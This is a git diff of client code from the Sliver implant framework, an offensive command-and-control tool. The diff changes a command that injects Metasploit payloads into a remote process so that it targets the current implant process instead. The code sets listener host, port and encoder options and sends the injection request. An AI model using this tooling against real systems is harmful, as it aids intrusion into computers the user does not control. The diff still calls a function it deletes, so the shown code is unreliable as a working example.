@@ -1,4 +1,4 @@
-package exec
+package msf
 
 /*
 	Sliver Implant Framework
@@ -28,11 +28,10 @@ import (
 	"github.com/bishopfox/sliver/client/console"
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// MsfInjectCmd - Inject a metasploit payload into a remote process.
-func MsfInjectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
+// MsfCmd - Inject a metasploit payload into the current remote process.
+func MsfCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	session, beacon := con.ActiveTarget.GetInteractive()
 	if session == nil && beacon == nil {
 		return
@@ -43,14 +42,9 @@ func MsfInjectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) 
 	lport, _ := cmd.Flags().GetInt("lport")
 	encoder, _ := cmd.Flags().GetString("encoder")
 	iterations, _ := cmd.Flags().GetInt("iterations")
-	pid, _ := cmd.Flags().GetInt("pid")
 
 	if lhost == "" {
-		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
-		return
-	}
-	if pid == -1 {
-		con.PrintErrorf("Invalid pid '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
+		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
 		return
 	}
 	var goos string
@@ -67,14 +61,13 @@ func MsfInjectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) 
 	msg := fmt.Sprintf("Sending msf payload %s %s/%s -> %s:%d ...",
 		payloadName, goos, goarch, lhost, lport)
 	con.SpinUntil(msg, ctrl)
-	msfTask, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
+	msfTask, err := con.Rpc.Msf(context.Background(), &clientpb.MSFReq{
 		Request:    con.ActiveTarget.Request(cmd),
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      uint32(lport),
 		Encoder:    encoder,
 		Iterations: int32(iterations),
-		PID:        uint32(pid),
 	})
 	ctrl <- true
 	<-ctrl
@@ -94,18 +87,5 @@ func MsfInjectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) 
 		})
 	} else {
 		PrintMsfRemote(msfTask, con)
-	}
-}
-
-// PrintMsfRemote - Print the results of the remote injection attempt.
-func PrintMsfRemote(msfRemote *sliverpb.Task, con *console.SliverClient) {
-	if msfRemote.Response == nil {
-		con.PrintErrorf("Empty response from msf payload injection task")
-		return
-	}
-	if msfRemote.Response.Err != "" {
-		con.PrintInfof("Executed payload on target")
-	} else {
-		con.PrintErrorf("Failed to inject payload: %s", msfRemote.Response.Err)
 	}
 }
